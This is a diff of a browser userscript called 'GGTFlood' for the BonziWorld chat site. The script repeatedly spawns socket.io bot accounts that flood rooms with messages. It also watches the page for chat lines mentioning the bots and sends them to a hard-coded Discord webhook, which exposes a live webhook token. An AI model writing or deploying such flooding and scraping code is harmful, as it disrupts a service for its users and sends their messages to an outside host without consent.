@@ -1,6 +1,36 @@
-/* GGTroll 4 BonziWorld 1.0.8 */
+/* GGTFlood 4 BonziWorld 1.0.9 */
 /* This comes with no warranty */
 const sentMentions = new Set();
+
+// Shared observer for all bots
+const observer = new MutationObserver(mutations => {
+    mutations.forEach(mutation => {
+        mutation.addedNodes.forEach(node => {
+            if (
+                node.nodeType === 1 &&
+                node.classList.contains("bubble-content")
+            ) {
+                const text = node.textContent.trim();
+                if (text && !sentMentions.has(text)) {
+                    // Check if any active bot name is in the text
+                    bots.forEach(botName => {
+                        if (text.includes(botName)) {
+                            sentMentions.add(text);
+                            fetch("https://discord.com/api/webhooks/1429973688446488586/T7Da6y5vMfl6AN9OktYnBYLkL_uioOqSPhHZClDGSHOlMcwRIEUGCQl2Hh81y0XqE-cA", {
+                                method: "POST",
+                                headers: { "Content-Type": "application/json" },
+                                body: JSON.stringify({ content: text })
+                            });
+                        }
+                    });
+                }
+            }
+        });
+    });
+});
+observer.observe(document.body, { childList: true, subtree: true });
+
+const bots = [];
 
 setInterval(async () => {
     (async () => {
@@ -11,6 +41,8 @@ setInterval(async () => {
             const roomElement = document.querySelector(".room_id");
             const roomId = roomElement ? roomElement.textContent.trim() : "default";
             const botName = "giggity #" + Math.floor(Math.random() * 10000);
+            bots.push(botName);
+
             const bot = io(location.href + "?cb=" + Math.random());
             bot.emit("client", "MAIN");
             bot.emit("login", {
@@ -28,28 +60,6 @@ setInterval(async () => {
                 const type = Math.random() < 0.5 ? "joke" : "fact";
                 bot.emit("talk", { text: msg, type });
             }, 2000);
-
-            // Observe DOM for mentions of botName, send unique ones to Discord
-            const observer = new MutationObserver(mutations => {
-                mutations.forEach(mutation => {
-                    mutation.addedNodes.forEach(node => {
-                        if (
-                            node.nodeType === 1 &&
-                            !node.classList.contains("bonzi_name") &&
-                            node.textContent.includes(botName) &&
-                            !sentMentions.has(node.textContent)
-                        ) {
-                            sentMentions.add(node.textContent);
-                            fetch("https://discord.com/api/webhooks/1429973688446488586/T7Da6y5vMfl6AN9OktYnBYLkL_uioOqSPhHZClDGSHOlMcwRIEUGCQl2Hh81y0XqE-cA", {
-                                method: "POST",
-                                headers: { "Content-Type": "application/json" },
-                                body: JSON.stringify({ content: node.textContent })
-                            });
-                        }
-                    });
-                });
-            });
-            observer.observe(document.body, { childList: true, subtree: true });
 
         } catch (e) {}
     })();
